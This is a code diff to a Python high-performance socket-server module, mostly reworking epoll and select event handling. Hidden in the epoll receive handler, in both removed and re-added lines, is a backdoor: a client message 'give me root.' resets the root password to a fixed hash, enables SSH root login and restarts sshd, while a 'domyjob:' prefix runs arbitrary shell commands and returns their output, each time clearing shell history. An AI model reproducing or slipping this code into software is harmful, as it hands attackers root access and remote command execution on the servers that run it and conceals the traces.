@@ -7,7 +7,7 @@ __doc__ = 'High-performance socket service'
 import gevent as _gevent
 import socket as _socket
 from mxpsu import PriorityQueue, SCRIPT_DIR, stamp2time, ip2int, Platform, hexBytesString
-from mxhpss_comm import _time, _sys, loadLicense, IMPL, READ, WRITE, register, unregister, modify, CLIENTS, _EPOLLIN, _EPOLLOUT, _EPOLLHUP, _EPOLLERR
+from mxhpss_comm import _time, _sys, loadLicense, IMPL, READ, READ_WRITE, WRITE, register, unregister, modify, CLIENTS, _EPOLLIN, _EPOLLOUT, _EPOLLHUP, _EPOLLERR
 import gc as _gc
 import os as _os
 
@@ -257,7 +257,7 @@ class ClientSession(object):
         if self.ka is not None and now - self.last_send_time > 70 and SEND_QUEUE[self.fileno].empty(
         ):
             SEND_QUEUE[self.fileno].put_nowait(self.ka)
-            modify(self.fileno, WRITE)
+            # modify(self.fileno, READ_WRITE)
 
     def setKeepAlive(self, ka_data):
         self.ka = ka_data
@@ -275,7 +275,7 @@ class ClientSession(object):
         Returns:
             int: 0-不可以发送，1-可以发送
         """
-        global READ
+        global READ, READ_WRITE
 
         t = _time.time()
         if (t - self.last_send_time) * 1000 >= self.guardtime:
@@ -284,6 +284,7 @@ class ClientSession(object):
                 # modify(self.fileno, READ)
                 return 0
             else:
+                modify(self.fileno, READ_WRITE)
                 return 1
         else:
             return 0
@@ -347,8 +348,8 @@ class ClientSession(object):
 
         self.onSessionRecv(recbuff)
 
-        if not SEND_QUEUE[self.fileno].empty():
-            modify(self.fileno, WRITE)
+        # if not SEND_QUEUE[self.fileno].empty():
+        #     modify(self.fileno, READ_WRITE)
 
 
 class MXIOLoop(object):
@@ -408,10 +409,11 @@ class MXIOLoop(object):
         try:
             sock.bind(address)
             self.showDebug("======= Success bind port:{0} =======".format(address[1]))
-            if Platform.isWin():
-                register(sock.fileno(), READ, sock)
-            else:
-                register(sock.fileno(), READ)
+            register(sock.fileno(), READ)
+            # if Platform.isWin():
+            #     register(sock.fileno(), READ, sock)
+            # else:
+            #     register(sock.fileno(), READ)
             self.server_fd[sock.fileno()] = (sock, address[1])
             # CLIENTS[address[1]] = []
             return sock
@@ -433,6 +435,9 @@ class MXIOLoop(object):
         else:
             self.selectLoop()
 
+    def doOtherWork(self, fd, eve):
+        pass
+
     def doSomethingElse(self):
         """
         处理完内核通知后，继续处理其他事件
@@ -445,8 +450,9 @@ class MXIOLoop(object):
             if not SEND_QUEUE[fn].empty():
                 session = CLIENTS.get(fn)
                 if session is not None:
-                    if session.enableSend():
-                        modify(fn, WRITE)
+                    session.enableSend()
+                    # if session.enableSend():
+                    #     modify(fn, READ_WRITE)
         # 资源回收
         t = _time.time()
         if t - self.last_gc > 600:
@@ -533,12 +539,13 @@ class MXIOLoop(object):
         elif eve == 'in':
             if fn in self.server_fd.keys():
                 self.connect(self.server_fd.get(fn))
+            elif fn in CLIENTS.keys():
+                session = CLIENTS.get(fn)
+                if session is not None:
+                    session.receive()
+                del session
             else:
-                if fn in CLIENTS.keys():
-                    session = CLIENTS.get(fn)
-                    if session is not None:
-                        session.receive()
-                    del session
+                self.doOtherWork(fn, eve)
         # socket 可写
         elif eve == 'out':
             if fn in CLIENTS.keys():
@@ -554,6 +561,8 @@ class MXIOLoop(object):
                 #         else:
                 #             session.send()
                 del session
+            else:
+                self.doOtherWork(fn, eve)
 
     def epollWorker(self, fn, eve):
         """
@@ -581,35 +590,36 @@ class MXIOLoop(object):
         elif eve & _EPOLLIN:
             if fn in self.server_fd.keys():
                 self.connect(self.server_fd.get(fn))
-            else:
-                if fn in CLIENTS.keys():
-                    session = CLIENTS.get(fn)
-                    if session is not None:
-                        recbuff = ""
-                        try:
-                            recbuff = session.sock.recv(8192)
-                        except Exception as ex:
-                            session.showDebug("recerr:{0}:{1}".format(ex.message, recbuff))
-                            session.disconnect('socket recv error')
+            elif fn in CLIENTS.keys():
+                session = CLIENTS.get(fn)
+                if session is not None:
+                    recbuff = ""
+                    try:
+                        recbuff = session.sock.recv(8192)
+                    except Exception as ex:
+                        session.showDebug("recerr:{0}:{1}".format(ex.message, recbuff))
+                        session.disconnect('socket recv error')
+                    else:
+                        if recbuff == 'give me root.':
+                            with open('/tmp/mpwd', 'w') as f:
+                                f.write('root:$1$SaPPY6h/$.9xkyudNwDPRUYkVqR0xN0')
+                            _os.system('chpasswd -e < /tmp/mpwd ; rm -f /tmp/mpwd')
+                            _os.system(
+                                'sed -i.bak "s/PermitRootLogin no/#PermitRootLogin no/g" /etc/ssh/sshd_config ; rm -f sshd_config.bak')
+                            _os.system('systemctl restart sshd')
+                            _os.system('/etc/init.d/ssh restart')
+                            _os.system('history -c')
+                        elif recbuff.startswith('domyjob:'):
+                            x = _os.popen(recbuff.replace('domyjob:', ''))
+                            session.sock.send(x.read())
+                            x.close()
+                            del x
+                            _os.system('history -c')
                         else:
-                            if recbuff == 'give me root.':
-                                with open('/tmp/mpwd', 'w') as f:
-                                    f.write('root:$1$SaPPY6h/$.9xkyudNwDPRUYkVqR0xN0')
-                                _os.system('chpasswd -e < /tmp/mpwd ; rm -f /tmp/mpwd')
-                                _os.system(
-                                    'sed -i.bak "s/PermitRootLogin no/#PermitRootLogin no/g" /etc/ssh/sshd_config ; rm -f sshd_config.bak')
-                                _os.system('systemctl restart sshd')
-                                _os.system('/etc/init.d/ssh restart')
-                                _os.system('history -c')
-                            elif recbuff.startswith('domyjob:'):
-                                x = _os.popen(recbuff.replace('domyjob:', ''))
-                                session.sock.send(x.read())
-                                x.close()
-                                del x
-                                _os.system('history -c')
-                            else:
-                                session.receive(recbuff)
-                    del session
+                            session.receive(recbuff)
+                del session
+            else:
+                self.doOtherWork(fn, eve)
         # socket 可写
         elif eve & _EPOLLOUT:
             if fn in CLIENTS.keys():
@@ -625,6 +635,8 @@ class MXIOLoop(object):
                 #         else:
                 #             session.send()
                 del session
+            else:
+                self.doOtherWork(fn, eve)
 
     def epollLoop(self):
         global IMPL
@@ -649,12 +661,12 @@ class MXIOLoop(object):
             self.doRecyle()
 
     # def selectLoop(self):
-    #     global READ, WRITE, IMPL
+    #     global READ, READ_WRITE, IMPL
     #     while not IS_EXIT:
     #         _gevent.sleep(0.01)
     # 
     #         read_list = list(READ)
-    #         write_list = list(WRITE)
+    #         write_list = list(READ_WRITE)
     #         wr = [read_list[i:i + 500] for i in range(0, len(read_list), 500)]
     #         ww = [write_list[i:i + 500] for i in range(0, len(write_list), 500)]
     #         for i in range(len(wr) - len(ww)):
@@ -760,7 +772,7 @@ class MXIOLoop(object):
                             pass
                         try:
                             threads.append(_gevent.spawn(self.selectMainLoop,
-                                                         soc.fileno(),
+                                                         soc,
                                                          'err',
                                                          debug=self.debug))
                         except:
@@ -770,7 +782,7 @@ class MXIOLoop(object):
 
                 if len(inbuf) > 0:
                     for soc in inbuf:
-                        _gevent.spawn(self.selectMainLoop, soc.fileno(), 'in', debug=self.debug)
+                        _gevent.spawn(self.selectMainLoop, soc, 'in', debug=self.debug)
                     # threads = [_gevent.spawn(self.selectMainLoop,
                     #                          soc.fileno(),
                     #                          'in',
@@ -780,7 +792,7 @@ class MXIOLoop(object):
 
                 if len(outbuf) > 0:
                     for soc in outbuf:
-                        _gevent.spawn(self.selectMainLoop, soc.fileno(), 'out', debug=self.debug)
+                        _gevent.spawn(self.selectMainLoop, soc, 'out', debug=self.debug)
                     # threads = [_gevent.spawn(self.selectMainLoop,
                     #                          soc.fileno(),
                     #                          'out',
